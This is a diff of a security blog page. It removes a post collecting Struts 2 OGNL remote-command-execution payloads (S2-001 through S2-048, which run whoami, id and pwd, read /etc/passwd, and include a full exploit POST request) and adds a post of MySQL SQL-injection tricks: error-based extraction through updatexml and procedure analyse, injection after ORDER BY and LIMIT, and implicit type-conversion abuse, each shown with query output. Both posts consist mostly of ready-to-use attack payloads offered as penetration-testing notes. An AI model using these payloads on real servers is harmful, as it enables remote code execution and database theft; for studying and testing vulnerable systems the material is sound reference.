@@ -3,9 +3,9 @@
 <head>
     <meta http-equiv="content-type" content="text/html; charset=utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Struts 2相关漏洞payload - Reber's Blog</title>
+    <title>SQL注入tips(MySQL) - Reber's Blog</title>
     <meta name="keywords" content="渗透测试,web安全,漏洞,python,php,linux">
-    <meta name="description" content="Struts 2相关漏洞payload">
+    <meta name="description" content="记录一些非常见的注入手法，或者说是mysql的一些特性">
     <meta name="author" content="reber">
 
     
@@ -78,12 +78,12 @@
     <div class="main">
         <div class="left">
             <div>
-                <h2>Struts 2相关漏洞payload</h2>
+                <h2>SQL注入tips(MySQL)</h2>
                 
                 <div class="post-meta">
                     <div style="padding:5px 5px 2px 5px;">
                         <i class="fa fa-calendar fa-fw"></i>
-                        <time>2018-06-25</time>
+                        <time>2018-05-23</time>
                         &nbsp;&nbsp;&nbsp;&nbsp;
                     
 
@@ -105,7 +105,7 @@
                         
                             <i class="fa fa-tags fa-fw"></i>
                             
-                                <a class="post-taxonomy-tag" href="http://wyb0.com/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C">代码执行</a>
+                                <a class="post-taxonomy-tag" href="http://wyb0.com/tags/injection">injection</a>
                             
                         
                         
@@ -117,84 +117,238 @@
                 
                 
 
-<h3 id="0x00-s2-001">0x00 S2-001</h3>
+<p>环境：MySQL 5.5.47</p>
 
-<pre><code>该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。
+<h3 id="0x00-注入点在order-by后面">0x00 注入点在Order by后面</h3>
+
+<pre><code>mysql&gt; select id,name,content from msg where id&gt;1 order by id into outfile 'C:\\Apps\\phpStudy\\WWW\\a.txt';
+Query OK, 1 row affected (0.01 sec)
 </code></pre>
 
-<pre><code>%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{&quot;whoami&quot;})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
+<pre><code>mysql&gt; select id,name,content from msg where id&gt;1 order by updatexml(0,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 0,1),0x7e),1);
+ERROR 1105 (HY000): XPATH syntax error: '~msg~'
 </code></pre>
 
-<h3 id="0x01-s2-005">0x01 S2-005</h3>
-
-<p>影响版本: 2.0.0 - 2.1.8.1</p>
-
-<pre><code>http://aa.com/index.action?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&amp;(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&amp;(asdf)(('%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))')(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1
+<pre><code>mysql&gt; select id,name,content from msg where id&gt;1 order by name procedure analyse(updatexml(1,concat(0x7e,database(),0x7e),1),1);
+ERROR 1105 (HY000): XPATH syntax error: '~rtest~'
 </code></pre>
 
-<h3 id="0x02-s2-007">0x02 S2-007</h3>
+<pre><code>mysql&gt; select name from msg where id&gt;1 order by if(1=1,1,(select 1 union select 2));
++----------+
+| name     |
++----------+
+| xiaohong |
++----------+
+1 row in set (0.00 sec)
+mysql&gt; select name from msg where id&gt;1 order by if(1=2,1,(select 1 union select 2));
+ERROR 1242 (21000): Subquery returns more than 1 row
 
-<p>影响版本: 2.0.0 - 2.2.3</p>
-
-<pre><code>当配置了验证规则 &lt;ActionName&gt;-validation.xml 时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回。
+mysql&gt; select name from msg where id&gt;1 order by (select case when(2&gt;1) then 1 else 1*(select 1 union select 2)end)=1;
++----------+
+| name     |
++----------+
+| xiaohong |
++----------+
+1 row in set (0.00 sec)
+mysql&gt; select name from msg where id&gt;1 order by (select case when(2&lt;1) then 1 else 1*(select 1 union select 2)end)=1;
+ERROR 1242 (21000): Subquery returns more than 1 row
 </code></pre>
 
-<pre><code>' + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())) + '
+<h3 id="0x01-注入点在limit后面">0x01 注入点在limit后面</h3>
+
+<ul>
+<li>limit前面没有order by可以使用union、analyse()</li>
+</ul>
+
+<pre><code>mysql&gt; select id,name,content from msg where id&gt;1 limit 1,1 union select 1,2,3;
++----+------+---------+
+| id | name | content |
++----+------+---------+
+|  1 | 2    | 3       |
++----+------+---------+
+1 row in set (0.01 sec)
+
+mysql&gt; select id,name,content from msg where id&gt;1 limit 1,1 procedure analyse();
++-------------------+---------------+---------------+------------+------------+
+| Field_name        | Min_value     | Max_value     | Min_length | Max_length |
++-------------------+---------------+---------------+------------+------------+
+| rtest.msg.name    | xiaohong      | xiaohong      |          8 |          8 |
+| rtest.msg.content | I have a cat. | I have a cat. |         13 |         13 |
++-------------------+---------------+---------------+------------+------------+
+
+------------------+-------+-------------------------+------+--------------------+
+ Empties_or_zeros | Nulls | Avg_value_or_avg_length | Std  | Optimal_fieldtype  |
+------------------+-------+-------------------------+------+--------------------+
+     0 |     0 | 8.0000                  | NULL | ENUM('xiaohong') NOT NULL     |
+     0 |     0 | 13.0000                 | NULL | ENUM('I have a cat.') NOT NULL|
+------------------+-------+-------------------------+------+--------------------+
+2 rows in set (0.00 sec)
 </code></pre>
 
-<h3 id="0x03-s2-012">0x03 S2-012</h3>
+<ul>
+<li>limit前面有order by则不可以使用union、analyse()</li>
+</ul>
 
-<p>影响版本: 2.1.0 - 2.3.13</p>
+<pre><code>mysql&gt; select id,name,content from msg where id&gt;1 limit 1,1 procedure analyse(updatexml(1,concat(0x7e,@@version,0x7e),1),1);
+ERROR 1105 (HY000): XPATH syntax error: '~5.5.47~'
 
-<pre><code>这里 UserAction 中定义有一个 name 变量，当触发 redirect 类型返回时，Struts2 获取使用 ${name} 获取其值，在这个过程中会对 name 参数的值执行 OGNL 表达式解析，从而可以插入任意 OGNL 表达式导致命令执行。
+mysql&gt; select id,name,content from msg where id&gt;1 order by name limit 1,1 procedure analyse(updatexml(1,concat(0x7e,@@version,0x7e),1),1);
+ERROR 1105 (HY000): XPATH syntax error: '~5.5.47~'
 </code></pre>
 
-<pre><code>%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{&quot;cat&quot;,&quot;/etc/passwd&quot;})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
+<h3 id="0x02-根据报错得到数据库名-表名-列名">0x02 根据报错得到数据库名、表名、列名</h3>
+
+<pre><code>#得到数据库名为rtest
+mysql&gt; select id,name,content from msg where id=2-a();
+ERROR 1305 (42000): FUNCTION rtest.a does not exist
+
+#得到表名为msg
+mysql&gt; select id,name,content from msg where id=2 and polygon(1);
+ERROR 1367 (22007): Illegal non geometric '1' value found during parsing
+mysql&gt; select id,name,content from msg where id=2 and polygon(id);
+ERROR 1367 (22007): Illegal non geometric '`rtest`.`msg`.`id`' value found during parsing
+
+#得到列名为id、name、content、useragent
+mysql&gt; select id,name,content from msg where id=2 and (select * from(select * from msg as a join msg as b)c);
+ERROR 1060 (42S21): Duplicate column name 'id'
+mysql&gt; select id,name,content from msg where id=2 and (select * from(select * from msg as a join msg as b using(id))c);
+ERROR 1060 (42S21): Duplicate column name 'name'
+mysql&gt; select id,name,content from msg where id=2 and (select * from(select * from msg as a join msg as b using(id,name))c);
+ERROR 1060 (42S21): Duplicate column name 'content'
+mysql&gt; select id,name,content from msg where id=2 and (select * from(select * from msg as a join msg as b using(id,name,content))c);
+ERROR 1060 (42S21): Duplicate column name 'useragent'
+mysql&gt; select id,name,content from msg where id=2 and (select * from(select * from msg as a join msg as b using(id,name,content,useragent))c);
+ERROR 1241 (21000): Operand should contain 1 column(s)
 </code></pre>
 
-<h3 id="0x04-s2-013-s2-014">0x04 S2-013/S2-014</h3>
+<h3 id="0x03-mysql的隐式转换">0x03 MySQL的隐式转换</h3>
 
-<p>影响版本: 2.0.0 - 2.3.14.1</p>
+<ul>
+<li><p>官方隐式转换规则</p>
 
-<pre><code>http://aa.com/link.action?a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec('id').getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println('dbapp%3D'%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D
+<ul>
+<li>两个参数至少有一个是 NULL 时，比较的结果也是 NULL，例外是使用 &lt;=&gt; 对两个 NULL 做比较时会返回 1，这两种情况都不需要做类型转换</li>
+<li>两个参数都是字符串，会按照字符串来比较，不做类型转换</li>
+<li>两个参数都是整数，按照整数来比较，不做类型转换</li>
+<li>十六进制的值和非数字做比较时，会被当做二进制串</li>
+<li>有一个参数是 TIMESTAMP 或 DATETIME，并且另外一个参数是常量，常量会被转换为 timestamp</li>
+<li>有一个参数是 decimal 类型，如果另外一个参数是 decimal 或者整数，会将整数转换为 decimal 后进行比较，如果另外一个参数是浮点数，则会把 decimal 转换为浮点数进行比较</li>
+<li>所有其他情况下，两个参数都会被转换为浮点数再进行比较</li>
+</ul></li>
+
+<li><p>数字和字符进行运算时会转换为double类型</p></li>
+</ul>
+
+<pre><code>mysql&gt; select 2+'4'; #数字和字符会转换为数字
++-------+
+| 2+'4' |
++-------+
+|     6 |
++-------+
+1 row in set (0.00 sec)
 </code></pre>
 
-<h3 id="0x05-s2-015">0x05 S2-015</h3>
+<pre><code>mysql&gt; select 'a'+'55'; #字符和字符会转换为数字
++----------+
+| 'a'+'55' |
++----------+
+|       55 |
++----------+
+1 row in set, 1 warning (0.00 sec)
 
-<p>影响版本: 2.0.0 - 2.3.14.2</p>
-
-<pre><code>http://aa.com/${%23context['xwork.MethodAccessor.denyMethodExecution']=false,%23f=%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),%23f.setAccessible(true),%23f.set(%23_memberAccess,true),@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())}.action
+mysql&gt; select '33'+'32d11a';
++-----------+
+| '33'+'3d' |
++-----------+
+|        65 |
++-----------+
+1 row in set, 1 warning (0.00 sec)
 </code></pre>
 
-<h3 id="0x06-s2-016">0x06 S2-016</h3>
+<ul>
+<li>concat()函数将数字转换为字符</li>
+</ul>
 
-<p>影响版本: 2.0.0 - 2.3.15</p>
-
-<pre><code>http://aa.com/index.action?redirect:%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23f.setAccessible%28true%29%2C%23f.set%28%23_memberAccess%2Ctrue%29%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec('whoami').getInputStream%28%29%29%7D
+<pre><code>mysql&gt; select concat(3,'test'); #前面的数字1被转换为字符
++------------------+
+| concat(3,'test') |
++------------------+
+| 3test            |
++------------------+
+1 row in set (0.00 sec)
 </code></pre>
 
-<h3 id="0x07-s2-048">0x07 S2-048</h3>
+<ul>
+<li>name类型为string，查询条件为int 0时可以查询</li>
+</ul>
 
-<p>影响版本: 2.0.0 - 2.3.32</p>
+<pre><code>mysql&gt; desc msg;
++-----------+---------------+------+-----+---------+----------------+
+| Field     | Type          | Null | Key | Default | Extra          |
++-----------+---------------+------+-----+---------+----------------+
+| id        | int(11)       | NO   | PRI | NULL    | auto_increment |
+| name      | varchar(30)   | NO   |     | NULL    |                |
+| content   | varchar(1024) | NO   |     | NULL    |                |
+| useragent | varchar(1024) | NO   |     | NULL    |                |
++-----------+---------------+------+-----+---------+----------------+
+4 rows in set (0.01 sec)
 
-<pre><code>%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())).(#q)}
+mysql&gt; select id,name,content from msg where id=1 and name=0;
++----+----------+--------------+
+| id | name     | content      |
++----+----------+--------------+
+|  1 | xiaoming | hello world. |
++----+----------+--------------+
+1 row in set, 2 warnings (0.00 sec)
+
+mysql&gt; show warnings;
++---------+------+----------------------------------------------+
+| Level   | Code | Message                                      |
++---------+------+----------------------------------------------+
+| Warning | 1292 | Truncated incorrect DOUBLE value: 'xiaoming' |
++---------+------+----------------------------------------------+
+2 rows in set (0.00 sec)
+
 </code></pre>
 
-<pre><code>POST /integration/saveGangster.action HTTP/1.1
-Host: 127.0.0.1:8080
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
-Referer: http://127.0.0.1:8080/integration/editGangster.action
-Cookie: a9866_times=4; __tins__19363536=%7B%22sid%22%3A%201531056473976%2C%20%22vd%22%3A%2010%2C%20%22expires%22%3A%201531060061844%7D; __51cke__=; __51laig__=10; JSESSIONID=7D9CB20E109D34C5B9C3CF8E3C356267
-Connection: close
-Upgrade-Insecure-Requests: 1
-Cache-Control: max-age=0
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 684
+<pre><code>mysql&gt; select id,name,content from msg;
++----+----------+---------------+
+| id | name     | content       |
++----+----------+---------------+
+|  1 | xiaoming | hello world.  |
+|  2 | xiaohong | I have a cat. |
+|  3 | 55lihua  | ni hao        |
++----+----------+---------------+
+3 rows in set (0.00 sec)
 
-name=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23q%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec('pwd').getInputStream%28%29%29%29.%28%23q%29%7D&amp;age=111&amp;__checkbox_bustedBefore=true&amp;description=1111
+mysql&gt; select id,name,content from msg where name='li'+'55';
++----+---------+---------+
+| id | name    | content |
++----+---------+---------+
+|  3 | 55lihua | ni hao  |
++----+---------+---------+
+1 row in set, 4 warnings (0.01 sec)
+
+mysql&gt; show warnings;
++---------+------+----------------------------------------------+
+| Level   | Code | Message                                      |
++---------+------+----------------------------------------------+
+| Warning | 1292 | Truncated incorrect DOUBLE value: 'xiaoming' |
+| Warning | 1292 | Truncated incorrect DOUBLE value: 'li'       |
+| Warning | 1292 | Truncated incorrect DOUBLE value: 'xiaohong' |
+| Warning | 1292 | Truncated incorrect DOUBLE value: '55lihua'  |
++---------+------+----------------------------------------------+
+4 rows in set (0.00 sec)
 </code></pre>
+
+<p><br></p>
+
+<h4 id="reference-侵删">Reference(侵删)：</h4>
+
+<ul>
+<li><a href="https://www.cnblogs.com/Le30bjectNs11/p/4341207.html">https://www.cnblogs.com/Le30bjectNs11/p/4341207.html</a></li>
+<li><a href="https://www.cnblogs.com/rollenholt/p/5442825.html">https://www.cnblogs.com/rollenholt/p/5442825.html</a></li>
+</ul>
 
                 
                 <div style="padding:10px 1px;">
@@ -211,8 +365,8 @@ name=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memb
     <div class="pure-u-12-24" style="text-align: left;">
         
         <nav class="prev">
-            <a href="http://wyb0.com/posts/injection-tips-of-mysql/">
-                <i class="fa fa-chevron-left"></i>&nbsp;&nbsp;&nbsp;SQL注入tips(MySQL)
+            <a href="http://wyb0.com/posts/thinkphp5-where-function/">
+                <i class="fa fa-chevron-left"></i>&nbsp;&nbsp;&nbsp;ThinkPHP5的where函数
             </a>
         </nav>
         
@@ -220,8 +374,8 @@ name=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memb
     <div class="pure-u-12-24" style="text-align: right;">
         
         <nav class="next">
-            <a href="http://wyb0.com/posts/php-session-unserialize/">
-                关于PHP SESSION反序列化&nbsp;&nbsp;&nbsp;<i class="fa fa-chevron-right"></i>
+            <a href="http://wyb0.com/posts/structs2-some-vulnerability-payload/">
+                Struts 2相关漏洞payload&nbsp;&nbsp;&nbsp;<i class="fa fa-chevron-right"></i>
             </a>
         </nav>
         
